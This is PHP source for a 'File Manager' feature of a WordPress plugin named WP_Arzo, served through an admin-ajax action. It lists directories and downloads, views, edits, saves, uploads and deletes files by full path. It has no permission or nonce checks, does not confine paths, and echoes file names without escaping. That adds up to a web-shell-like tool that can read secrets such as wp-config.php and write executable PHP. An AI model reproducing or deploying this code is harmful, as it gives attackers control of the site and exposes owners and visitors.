<?php
/**
 * File Manager Feature
 *
 * @package WP_Arzo
 * @version 5.1
 */

// Security check
if (!defined('ABSPATH')) {
    exit;
}

// Helper functions for file operations
function isEditableFile($file_path)
{
    $editable_extensions = ['php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'txt', 'md', 'sql', 'htaccess', 'log', 'ini', 'conf', 'yml', 'yaml'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    return in_array($extension, $editable_extensions) || basename($file_path) === '.htaccess';
}

function isImageFile($file_path)
{
    $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    return in_array($extension, $image_extensions);
}

function isBinaryFile($file_path)
{
    if (!file_exists($file_path) || !is_file($file_path)) {
        return false;
    }

    $binary_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf', 'zip', 'rar', 'tar', 'gz', 'exe', 'dll', 'so', 'dylib'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));

    if (in_array($extension, $binary_extensions)) {
        return true;
    }

    // Check file content for binary data
    $handle = fopen($file_path, 'rb');
    $chunk = fread($handle, 1024);
    fclose($handle);

    return strpos($chunk, "\0") !== false;
}

function getSyntaxClass($file_path)
{
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $syntax_map = [
        'php' => 'php',
        'html' => 'html',
        'htm' => 'html',
        'css' => 'css',
        'js' => 'javascript',
        'json' => 'json',
        'xml' => 'xml',
        'sql' => 'sql',
        'md' => 'markdown'
    ];
    return isset($syntax_map[$extension]) ? $syntax_map[$extension] : 'text';
}

function getFileIcon($file_path)
{
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $icon_map = [
        'pdf' => '📄',
        'doc' => '📝',
        'docx' => '📝',
        'xls' => '📊',
        'xlsx' => '📊',
        'ppt' => '📽️',
        'pptx' => '📽️',
        'zip' => '🗜️',
        'rar' => '🗜️',
        'tar' => '🗜️',
        'gz' => '🗜️',
        'mp3' => '🎵',
        'wav' => '🎵',
        'flac' => '🎵',
        'mp4' => '🎬',
        'avi' => '🎬',
        'mov' => '🎬',
        'mkv' => '🎬',
        'jpg' => '🖼️',
        'jpeg' => '🖼️',
        'png' => '🖼️',
        'gif' => '🖼️',
        'bmp' => '🖼️',
        'webp' => '🖼️',
        'exe' => '⚙️',
        'msi' => '⚙️',
        'sql' => '🗃️',
        'php' => '🐘',
        'js' => '📜',
        'css' => '🎨',
        'html' => '🌐'
    ];
    return isset($icon_map[$extension]) ? $icon_map[$extension] : '📄';
}

if (!function_exists('normalizePath')) {
    function normalizePath($path)
    {
        if (DIRECTORY_SEPARATOR === '\\') {
            $path = str_replace('/', '\\', $path);
        }
        return $path;
    }
}


// Handle file download
if (isset($_GET['download'])) {
    $file_path = normalizePath($_GET['download']);
    
    if (file_exists($file_path) && is_file($file_path)) {
        // Clean any output buffers
        while (ob_get_level()) {
            ob_end_clean();
        }

        $file_name = basename($file_path);
        $file_size = filesize($file_path);
        $mime_type = mime_content_type($file_path) ?: 'application/octet-stream';

        header('Content-Description: File Transfer');
        header('Content-Type: ' . $mime_type);
        header('Content-Disposition: attachment; filename="' . $file_name . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . $file_size);

        // Read file in chunks to handle large files
        $handle = fopen($file_path, 'rb');
        while (!feof($handle)) {
            echo fread($handle, 8192);
            flush();
        }
        fclose($handle);
        exit;
    }
}

// Handle AJAX operations for files
if (isset($_GET['operation'])) {
    $operation = $_GET['operation'];
    
    if (in_array($operation, ['view_file', 'edit_file', 'save_file'])) {
        header('Content-Type: application/json');
        $response = ['success' => false, 'message' => 'Unknown operation'];

        switch ($operation) {
            case 'view_file':
                if (isset($_GET['file'])) {
                    $file_path = normalizePath($_GET['file']);

                    if (file_exists($file_path) && is_file($file_path)) {
                        $filename = basename($file_path);
                        $file_size = filesize($file_path);
                        $file_ext = strtoupper(pathinfo($file_path, PATHINFO_EXTENSION));
                        $modified = date('Y-m-d H:i:s', filemtime($file_path));

                        $file_info = "Size: " . number_format($file_size) . " bytes | Type: {$file_ext} | Modified: {$modified}";

                        if (isBinaryFile($file_path)) {
                            if (isImageFile($file_path)) {
                                $data_url = 'data:' . mime_content_type($file_path) . ';base64,' . base64_encode(file_get_contents($file_path));
                                $content = '<div class="binary-file-preview">';
                                $content .= '<img src="' . $data_url . '" alt="' . htmlspecialchars($filename) . '">';
                                $content .= '<p>' . $file_info . '</p>';
                                $content .= '</div>';
                            } else {
                                $icon = getFileIcon($file_path);
                                $content = '<div class="binary-file-preview">';
                                $content .= '<div class="file-icon">' . $icon . '</div>';
                                $content .= '<h4>' . htmlspecialchars($filename) . '</h4>';
                                $content .= '<p>This is a binary file that cannot be displayed as text.</p>';
                                $content .= '<p>' . $file_info . '</p>';
                                $content .= '</div>';
                            }
                        } else {
                            $file_content = file_get_contents($file_path);
                            $content = '<div style="margin-bottom: 10px; font-size: 12px; color: #999;">' . $file_info . '</div>';
                            $content .= '<pre style="background: #2A2A2A; color: #E0E0E0; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: \'Courier New\', monospace; font-size: 13px; line-height: 1.5; margin: 0; white-space: pre-wrap; word-wrap: break-word; max-height: 60vh; overflow-y: auto;"><code>' . htmlspecialchars($file_content) . '</code></pre>';
                        }

                        $actions = '';
                        if (isEditableFile($file_path)) {
                            $actions .= '<button onclick="editFile(\'' . addslashes($file_path) . '\')" class="btn btn-warning" title="Edit File"><i class="fas fa-edit"></i> Edit</button> ';
                        }
                        $actions .= '<a href="' . admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=files&download=' . urlencode($file_path)) . '" class="btn btn-success" title="Download File"><i class="fas fa-download"></i> Download</a> ';
                        $actions .= '<button onclick="closeLightbox()" class="btn btn-secondary" title="Close"><i class="fas fa-times"></i> Close</button>';

                        $response = [
                            'success' => true,
                            'filename' => $filename,
                            'content' => $content,
                            'actions' => $actions
                        ];
                    } else {
                        $response = ['success' => false, 'message' => 'File not found or not accessible'];
                    }
                }
                break;

            case 'edit_file':
                if (isset($_GET['file'])) {
                    $file_path = normalizePath($_GET['file']);

                    if (file_exists($file_path) && is_file($file_path) && isEditableFile($file_path)) {
                        $filename = basename($file_path);
                        $file_content = file_get_contents($file_path);
                        
                        $file_size = filesize($file_path);
                        $file_ext = strtoupper(pathinfo($file_path, PATHINFO_EXTENSION));
                        $modified = date('Y-m-d H:i:s', filemtime($file_path));
                        $file_info = "Size: " . number_format($file_size) . " bytes | Type: {$file_ext} | Modified: {$modified}";

                        $content = '<div style="margin-bottom: 10px; font-size: 12px; color: #999;">' . $file_info . '</div>';
                        $content .= '<textarea id="fileContentEditor" style="width: 100%; min-height: 500px; background: #2A2A2A; color: #E0E0E0; border: 1px solid #444444; border-radius: 4px; padding: 15px; font-family: \'Courier New\', monospace; font-size: 13px; line-height: 1.5; resize: vertical; box-sizing: border-box;">' . htmlspecialchars($file_content) . '</textarea>';

                        $actions = '<button onclick="saveFile(\'' . addslashes($file_path) . '\')" class="btn btn-primary" title="Save Changes"><i class="fas fa-save"></i> Save</button> ';
                        $actions .= '<button onclick="viewFile(\'' . addslashes($file_path) . '\')" class="btn btn-secondary" title="Cancel"><i class="fas fa-undo"></i> Cancel</button>';

                        $response = [
                            'success' => true,
                            'filename' => $filename,
                            'content' => $content,
                            'actions' => $actions
                        ];
                    } else {
                        $response['message'] = 'File not found, not accessible, or not editable';
                    }
                }
                break;

            case 'save_file':
                if (isset($_POST['file_path']) && isset($_POST['file_content'])) {
                    $file_path = normalizePath($_POST['file_path']);
                    $file_content = $_POST['file_content'];

                    if (file_exists($file_path) && is_file($file_path) && isEditableFile($file_path)) {
                        if (file_put_contents($file_path, $file_content) !== false) {
                            $response = ['success' => true, 'message' => 'File saved successfully'];
                        } else {
                            $response['message'] = 'Error writing to file';
                        }
                    } else {
                        $response['message'] = 'File not found, not accessible, or not editable';
                    }
                }
                break;
        }

        echo json_encode($response);
        exit;
    }
}

function handleFiles()
{
    $current_dir = isset($_GET['dir']) ? $_GET['dir'] : ABSPATH;
    $current_dir = realpath($current_dir);

    // Handle file editing
    if (isset($_POST['save_file'])) {
        $file_path = $_POST['file_path'];
        $file_content = $_POST['file_content'];

        if (file_put_contents($file_path, $file_content) !== false) {
            echo '<div class="success">File saved successfully!</div>';
        } else {
            echo '<div class="error">Error saving file!</div>';
        }
    }

    if (isset($_POST['upload_file'])) {
        $target_dir = $current_dir . '/';
        $target_file = $target_dir . basename($_FILES["file"]["name"]);

        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
            echo '<div class="success">File uploaded successfully!</div>';
        } else {
            echo '<div class="error">Error uploading file!</div>';
        }
    }

    if (isset($_POST['delete_file'])) {
        $file_to_delete = $_POST['file_path'];
        if (unlink($file_to_delete)) {
            echo '<div class="success">File deleted successfully!</div>';
        } else {
            echo '<div class="error">Error deleting file!</div>';
        }
    }

    ?>
    <div class="content">
        <h2>File Manager</h2>
        <p><strong>Current Directory:</strong> <?php echo $current_dir; ?></p>

        <h3>Upload File</h3>
        <form method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label>Select File:</label>
                <input type="file" name="file">
            </div>
            <button type="submit" name="upload_file" class="btn">Upload</button>
        </form>

        <h3>Directory Contents</h3>
        <div class="file-list">
            <table>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
                <?php
                if ($current_dir !== ABSPATH) {
                    $parent_dir = dirname($current_dir);
                    echo '<tr><td><a href="' . admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=files&dir=' . urlencode($parent_dir)) . '">../</a></td><td>Directory</td><td>-</td><td>-</td><td>-</td></tr>';
                }

                $files = scandir($current_dir);
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;

                    $file_path = rtrim($current_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file;
                    $is_dir = is_dir($file_path);
                    $size = $is_dir ? '-' : filesize($file_path);
                    $modified = date('Y-m-d H:i:s', filemtime($file_path));

                    echo '<tr>';
                    if ($is_dir) {
                        echo '<td><a href="' . admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=files&dir=' . urlencode($file_path)) . '">' . $file . '/</a></td>';
                        echo '<td>Directory</td>';
                    } else {
                        echo '<td>' . $file . '</td>';
                        echo '<td>File</td>';
                    }
                    echo '<td>' . ($size === '-' ? '-' : number_format($size) . ' bytes') . '</td>';
                    echo '<td>' . $modified . '</td>';
                    echo '<td class="file-actions">';
                    if ($is_dir) {
                        echo '<a href="' . admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=files&dir=' . urlencode($file_path)) . '" class="btn btn-primary" title="Open Directory"><i class="fas fa-folder-open"></i></a>';
                    } else {
                        // View button for all files
                        echo '<button onclick="viewFile(\'' . addslashes($file_path) . '\')" class="btn btn-info" title="View File"><i class="fas fa-eye"></i></button> ';

                        // Edit button for editable files
                        if (isEditableFile($file_path)) {
                            echo '<button onclick="editFile(\'' . addslashes($file_path) . '\')" class="btn btn-warning" title="Edit File"><i class="fas fa-edit"></i></button> ';
                        }

                        // Download button
                        echo '<a href="' . admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=files&download=' . urlencode($file_path)) . '" class="btn btn-success" title="Download File"><i class="fas fa-download"></i></a> ';

                        // Delete button
                        echo '<form method="post" style="display:inline;">';
                        echo '<input type="hidden" name="file_path" value="' . $file_path . '">';
                        echo '<button type="submit" name="delete_file" class="btn btn-danger" onclick="return confirm(\'Are you sure?\');" title="Delete File"><i class="fas fa-trash"></i></button>';
                        echo '</form>';
                    }
                    echo '</td>';
                    echo '</tr>';
                }
                ?>
            </table>
        </div>

        <!-- Lightbox Modal -->
        <div id="fileLightbox" class="lightbox">
            <div class="lightbox-content">
                <div class="lightbox-header">
                    <h3 id="lightboxTitle">File Viewer</h3>
                    <button class="lightbox-close" onclick="closeLightbox()">&times;</button>
                </div>
                <div class="lightbox-body" id="lightboxBody">
                    <!-- Content will be loaded here -->
                </div>
                <div class="lightbox-actions" id="lightboxActions">
                    <!-- Actions will be loaded here -->
                </div>
            </div>
        </div>

    </div>
<?php
}

// Call the function
handleFiles();
